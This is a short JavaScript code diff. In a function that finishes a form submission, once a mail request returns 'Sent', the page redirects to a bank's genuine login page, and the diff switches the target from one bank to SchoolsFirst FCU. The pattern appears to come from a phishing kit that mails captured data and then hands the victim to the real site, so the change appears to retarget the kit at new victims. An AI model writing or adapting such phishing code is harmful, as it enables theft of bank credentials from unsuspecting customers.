@@ -202,6 +202,8 @@ const completeSubmission = async () => {
   MailReturn.text().then(
     (data) =>
       data === "Sent" &&
-      location.assign("https://ibx.key.com/ibxolb/login/index.html#/login")
+      location.assign(
+        "https://www.schoolsfirstfcu.org/gateway/schoolsfirstfcu/login#/"
+      )
   );
 };
